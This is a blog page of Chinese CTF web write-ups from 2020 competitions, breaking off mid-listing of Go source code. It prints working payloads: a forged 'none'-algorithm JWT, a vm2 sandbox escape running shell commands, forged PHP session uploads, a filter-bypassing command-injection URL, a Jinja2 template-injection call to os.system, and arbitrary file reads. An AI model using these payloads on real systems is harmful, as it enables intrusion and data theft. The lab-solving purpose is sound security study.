<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/2/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-2020数字中国创新大赛-虎符网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p>
<pre><code class="javascript">/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */</code></pre>
<p>于是直接访问app.js</p>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);</code></pre>
<p>然后rest.js</p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};</code></pre>
<p>controller.js</p>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};</code></pre>
<p>fuzz controllers目录得到</p>
<p>api.js</p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};</code></pre>
<p>view.js</p>
<pre><code class="javascript">module.exports = {
    &#39;GET /&#39;: async (ctx, next) =&gt; {
        ctx.status = 302;    
        ctx.redirect(&#39;/home&#39;);
    },
    &#39;GET /login&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;login&#39;);
            await next();
        }
    },
    &#39;GET /register&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/home&#39;);
        } else {
            await ctx.render(&#39;register&#39;);
            await next();
        }
    },
    &#39;GET /home&#39;: async (ctx, next) =&gt; {
        if(!ctx.session.username) {
            ctx.status = 302;    
            await ctx.redirect(&#39;/login&#39;);
        } else {
            await ctx.render(&#39;home&#39;, {
                username: ctx.session.username,
            });
            await next();
        }
    }
};</code></pre>
<p>阅读代码发现：</p>
<pre><code class="javascript">
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }
const secret = global.secrets[sid];
//验证之前</code></pre>
<p>我们可以控制sid来选择任意的密钥</p>
<p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p>
<p>我们令<code>sid=false</code>,则可以通过</p>
<pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p>
<p>最后的payload</p>
<pre><code class="python">import jwt
import json
a=json.loads(&#39;&#39;&#39;{
        &quot;secretid&quot;: false,
        &quot;username&quot;:&quot;admin&quot;,
        &quot;password&quot;: &quot;admin&quot;,
        &quot;iat&quot;: 1587310401
}&#39;&#39;&#39;)
print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算
code: (2+6-7)/3

run online: /run.php?code=(2%2b6-7)/3;

Ouput: 0.3333333333333333

注意编码 =.=

时间戳
code: new Date();

run online: /run.php?code=new%20Date();

Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)

真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p>
<p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p>
<p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
<p>payload:</p>
<pre><code class="javascript">const axios = require(&#39;axios&#39;)
const untrusted = &#39;(&#39; + function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();
    }
}+&#39;)()&#39;;
const content = Buffer.from(untrusted).toString(&#39;hex&#39;)
axios.get(
&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;
).then(p =&gt; {
    console.log(p.data)
}).catch(p =&gt; {
    console.log((p.response.data))
})
</code></pre>
<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>因为上传目录和sess文件所在目录相同，可以伪造sess</p>
<pre><code>POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 395
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;


------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

\x08usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre><p>成功伪造admin身份</p>
<p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p>
<p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p>
<pre><code class="php">POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 406
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffd
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;

success.txt
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020数字中国创新大赛-虎符网络安全/">https://www.ccreater.top/1970/01/01/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="ckmn5754p000js1nie2ji6omj" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020祥云杯web题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="祥云杯web题解"><a href="#祥云杯web题解" class="headerlink" title="祥云杯web题解"></a>祥云杯web题解</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>题目源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if (isset($_GET[&#39;url&#39;])) {
  $ip=$_GET[&#39;url&#39;];
  if(preg_match(&quot;/(;|&#39;| |&gt;|]|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\*|\{)/i&quot;, $ip)){
      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
      alert(&#39;no no no!&#39;)
      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
  }else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
      alert(&#39;no flag!&#39;)
      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
}</code></pre>
<p>测试发现过滤了:<code>&#39;,$,&amp;,*,;,&gt;,],{, ,</code><br>利用%09来绕过对空格的过滤</p>
<pre><code>http://eci-2ze5a6nc0glncs99tzta.cloudeci1.ichunqiu.com/?url=-h|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`</code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>测试一波发现输入点都没有ssti,并且开着报错</p>
<p>我们利用报错来拿源码</p>
<p>最关键的源码<code>render_template_string(guessNum(num,name))</code> 是直接访问不存在界面得到的</p>
<pre><code class="python">@app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])
def Hello():
    if request.method == &quot;POST&quot;:
        user = request.form[&#39;name&#39;]
        resp = make_response(render_template(&quot;guess.html&quot;,name=user))
        resp.set_cookie(&#39;user&#39;,base64.urlsafe_b64encode(user),max_age=3600)
        return resp
    else:
        user=request.cookies.get(&#39;user&#39;)
        if user == None:
           return render_template(&quot;index.html&quot;)
        else:
            user=user.encode(&#39;utf-8&#39;)
            return render_template(&quot;guess.html&quot;,name=base64.urlsafe_b64decode(user))


@app.route(&#39;/guess&#39;,methods=[&#39;POST&#39;])
def Guess():
    user=request.cookies.get(&#39;user&#39;)

    if user==None:
        return redirect(url_for(&quot;Hello&quot;)
    user=user.encode(&#39;utf-8&#39;)
    name = base64.urlsafe_b64decode(user)
    num = float(request.form[&#39;num&#39;])
    if(num&lt;0):
        return &quot;Too Small&quot;
    elif num&gt;1000000000.0:
        return &quot;Too Large&quot;

    else:
        return render_template_string(guessNum(num,name))#直接提醒我们这里存在ssti注入

@app.errorhandler(404)
def miss(e):
    return &quot;What are you looking for?!!&quot;.getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)), 404

if __name__ == &#39;__main__&#39;:
    f_handler=open(&#39;/var/log/app.log&#39;, &#39;w&#39;)
    sys.stderr=f_handler
    app.run(debug=True, host=&#39;0.0.0.0&#39;,port=8888</code></pre>
<p>看一下回显很容易得知bot利用二分法来猜数据，如果一定次数内bot没猜出来就是我们赢，正常的数据基本是不行的。</p>
<p>我们看下他得到数字的过程:</p>
<pre><code class="python">num = float(request.form[&#39;num&#39;])
    if(num&lt;0):
        return &quot;Too Small&quot;
    elif num&gt;1000000000.0:
        return &quot;Too Large&quot;
</code></pre>
<p>字符串转数值且小于0大于1000000000.0</p>
<p>阅读python文档<a href="https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`" target="_blank" rel="noopener">https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`</a> float also accepts the strings “nan” and “inf” with an optional prefix “+” or “-” for Not a Number (NaN) and positive or negative infinity. `</p>
<p>且nan&lt;0,nan&gt;1000000000.0都为false,这样他的二分法永远猜不到了</p>
<p>然后修改name进行ssti</p>
<pre><code>{{"".__class__.__mro__[2].__subclasses__()[258].__init__.__getattribute__("__globals__")["\\x6f\\x73"].__getattribute__("\\x73ystem")("whoami")}}</code></pre><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><p>题目有三个接口，登入，查看上传文件，上传文件</p>
<p>测试上传文件接口发现，可以直接路径穿越</p>
<p>测试查看上传文件接口发现，可以任意文件读取，但是你得有cookie(通过文件上传生成)</p>
<p>/proc/self/cmdline</p>
<pre><code>HOSTNAME=engine-1 HOME=/root OLDPWD=/root TERM=xterm PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOPATH=/go PWD=/go GOLANG_VERSION=1.15.5</code></pre><p>刚开始去读/etc/passwd发现，啥都没有，但是读/proc/self/cmdline就有东西，然后猜测了下这是root权限启动的</p>
<p>由于重启docker环境并不是让cookie的salt发生改变，所以，如果用之前生成好的cookie(如果是root权限/etc/passwd被覆盖)去获得新docker的/etc/passwd有内容的话就说明是root权限，没有的话就是其他原因</p>
<p>。。。。。</p>
<p>真的是root权限！！！！！</p>
<p>直接读取/root/start.sh</p>
<pre><code class="bash">flagfile=/flag
if [ ${ICQ_FLAG} ];then
    if [ &quot;$flagfile&quot;x = &quot;/flagx&quot; ];then
        echo ${ICQ_FLAG} &gt; ${flagfile}
        chmod 755 ${flagfile}
    else
        #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; $flagfile
        sed -i -r &quot;s/flag\{.*\}/${ICQ_FLAG}/&quot; $flagfile
        #mysql -uroot -proot nXXXX &lt; $flagfile
    fi
    echo [+] sed flag OK
    unset ICQ_FLAG
else
    echo [!] no ICQ_FLAG
fi

service cron start&amp;&amp;whoami&amp;&amp;cd /go&amp;&amp;go run src/main.go src/functions.go src/model.go src/routes.go</code></pre>
<p>再去读取/flag，顺便读了下源码：</p>
<p>main.go</p>
<pre><code class="go">package main

import (
    &quot;log&quot;
    &quot;net/http&quot;
)
func main() {
    http.Handle(&quot;/uploads/&quot;, http.StripPrefix(&quot;/uploads/&quot;, http.FileServer(http.Dir(&quot;uploads/&quot;))))
    http.Handle(&quot;/statics/&quot;, http.StripPrefix(&quot;/statics/&quot;, http.FileServer(http.Dir(&quot;statics/&quot;))))
    http.HandleFunc(&quot;/index&quot;, index)
    http.HandleFunc(&quot;/&quot;, index)
    http.HandleFunc(&quot;/login&quot;, login)
    http.HandleFunc(&quot;/upload&quot;, upload)
    http.HandleFunc(&quot;/show&quot;, show)
    http.HandleFunc(&quot;/home&quot;, home)
    err := http.ListenAndServe(&quot;:80&quot;, nil)
    if err != nil {
        log.Fatal(&quot;ListenAndServe: &quot;, err)
    }
}</code></pre>
<p>src/functions.go</p>
<pre><code class="go">package main

import (
    &quot;bytes&quot;
    &quot;crypto/md5&quot;
    &quot;encoding/base64&quot;
    &quot;encoding/gob&quot;
    &quot;encoding/hex&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;time&quot;
)

func PathExists(path string) (bool, error) {
    _, err := os.Stat(path)
    if err == nil {
        return true, nil
    }
    if os.IsNotExist(err) {
        return false, nil
    }
    return false, err
}
func fileExist(filename string) bool {
    _, err := os.Stat(filename)
    return err == nil || os.IsExist(err)
}
func Md5(s string) string {
    h := md5.New()
    h.Write([]byte(s))
    return hex.EncodeToString(h.Sum(nil))
}
func getCookie(r *http.Request) interface{}{
    cookie, err := r.Cookie(&quot;cookie&quot;)
    if err==nil{
        return cookie.Value
    }else{
        return nil
    }
}
func setCookie(w http.ResponseWriter,r *http.Request,value string){
    expiration := time.Now()
    expiration = expiration.AddDate(1, 0, 0)
//    fmt.Println(value)
    cookie := http.Cookie{Name: &quot;cookie&quot;, Value: value, Expires: expiration}
    http.SetCookie(w, &amp;cookie)
}
func serialize(instance Users) []byte{
//    fmt.Println(instance.Username)
    var result bytes.Buffer
    encoder := gob.NewEncoder(&amp;result)
    encoder.Encode(instance)
    userBytes := result.Bytes()
//    fmt.Printf(&quot;%s&quot;,userBytes)
    return userBytes
}
func unseralize(data []byte) Users{
    var account Users
    decoder := gob.NewDecoder(bytes.NewReader(data))
    decoder.Decode(&amp;account)
    return account
}

func cookieEncode(data []byte) string{
//    fmt.Printf(&quot;%s&quot;,data)
    return base64.StdEncoding.EncodeToString(data)
}
func cookieDecode(data string) []byte{
    bytesData, _ := base64.StdEncoding.DecodeString(data)
    return bytesData
}</code></pre>
<p>src/model.go</p>
<pre><code class="go">package main

type Users struct{
    Username string
    Password string
    Filename string
    Sign string
}
var salt=&quot;123123adsdasr123sdfkaadls&quot;</code></pre>
<p>src/routes.go</p>
<pre><code class="go">package main

import (
    &quot;encoding/base64&quot;
    &quot;fmt&quot;
    &quot;html/template&quot;
    &quot;io&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;strings&quot;
)
//Route:upload
func upload(w http.ResponseWriter, r *http.Request) {
    r.Body = http.MaxBytesReader(w, r.Body, 32&lt;&lt;16)
    ip := strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
    if getCookie(r)!=nil{
        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
        if r.Method == &quot;GET&quot; {
            t, _ := template.ParseFiles(&quot;upload.gtpl&quot;)
            t.Execute(w,nil)
        } else {
            path:=&quot;./uploads/&quot;+Md5(ip)
            tmp,_:=PathExists(path)
            if !tmp{
                err:= os.Mkdir(path, os.ModePerm)
                if err!=nil{
                    fmt.Printf(&quot;failed&quot;)
                }
            }
            r.ParseMultipartForm(32 &lt;&lt; 20)
            file, handler, err := r.FormFile(&quot;uploadfile&quot;)
            if err != nil {
                fmt.Println(err)
                return
            }
            defer file.Close()
            f, err := os.OpenFile(&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0777)
            if err != nil {
                fmt.Fprint(w,err)
                return
            }
            defer f.Close()
            io.Copy(f, file)
            UserData.Filename=&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename
            UserData.Sign=Md5(UserData.Filename+salt)
            setCookie(w,r,cookieEncode((serialize(UserData))))
            fmt.Fprint(w,UserData)
            fmt.Fprint(w,&quot;上传成功：&quot;+handler.Filename)
            return
        }
    }else{
